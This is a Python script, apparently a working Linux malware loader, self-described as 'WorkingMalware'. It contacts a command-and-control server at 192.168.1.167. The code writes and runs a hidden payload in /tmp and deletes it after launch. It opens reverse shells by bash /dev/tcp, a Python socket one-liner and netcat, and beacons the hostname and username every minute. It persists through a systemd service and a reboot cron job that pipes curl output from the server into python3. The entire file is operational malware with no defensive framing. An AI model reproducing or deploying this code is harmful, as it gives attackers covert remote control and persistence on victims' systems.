#!/usr/bin/env python3
"""
FIXED Loader - No memfd_create issues
"""

import os
import requests
import subprocess
import time
import threading
import sys

class WorkingMalware:
    def __init__(self):
        self.c2_server = "http://192.168.1.167:8000"
    
    def execute_payload(self, payload_script):
        """Execute payload without memfd - just use subprocess"""
        try:
            # Write to temporary location and execute
            with open("/tmp/.payload.sh", "w") as f:
                f.write(payload_script)
            
            os.chmod("/tmp/.payload.sh", 0o755)
            subprocess.Popen(["/tmp/.payload.sh"], 
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
            
            # Clean up after execution starts
            time.sleep(2)
            os.remove("/tmp/.payload.sh")
            
        except Exception as e:
            print(f"Payload execution failed: {e}")
    
    def start_reverse_shell(self):
        """Start reverse shell - MULTIPLE METHODS"""
        methods = [
            # Method 1: Simple bash
            "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &",
            
            # Method 2: Python
            """python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.167',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &""",
            
            # Method 3: Netcat if available
            "nc -e /bin/bash 192.168.1.167 4444 &"
        ]
        
        for method in methods:
            try:
                subprocess.Popen(["/bin/bash", "-c", method],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL,
                               stdin=subprocess.DEVNULL)
                print(f"[✅] Reverse shell started with method: {method[:50]}...")
                break
            except Exception as e:
                continue
    
    def beacon_to_c2(self):
        """Send beacon to C2 server"""
        def beacon_loop():
            while True:
                try:
                    hostname = os.uname().nodename
                    data = {
                        "hostname": hostname,
                        "user": os.getenv("USER", "unknown"),
                        "status": "alive",
                        "timestamp": time.time()
                    }
                    requests.post(f"{self.c2_server}/beacon", 
                                json=data, timeout=10)
                except Exception:
                    pass  # Silent fail
                time.sleep(60)
        
        threading.Thread(target=beacon_loop, daemon=True).start()
    
    def ensure_persistence(self):
        """Make sure we survive reboots"""
        persistence_checks = [
            # Check systemd service
            "systemctl is-active network-monitor.service >/dev/null 2>&1 || systemctl start network-monitor.service",
            
            # Check cron job exists
            """crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -""",
            
            # Direct restart if needed
            "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
        ]
        
        for check in persistence_checks:
            try:
                subprocess.run(check, shell=True, 
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             timeout=10)
            except Exception:
                pass
    
    def run(self):
        """Main execution loop"""
        print("[✅] Malware loader started successfully")
        
        # Start beacon
        self.beacon_to_c2()
        
        # Start reverse shell
        self.start_reverse_shell()
        
        # Ensure persistence
        self.ensure_persistence()
        
        print("[✅] All components started. Malware is persistent.")
        
        # Keep alive
        while True:
            time.sleep(60)

if __name__ == "__main__":
    malware = WorkingMalware()
    malware.run()
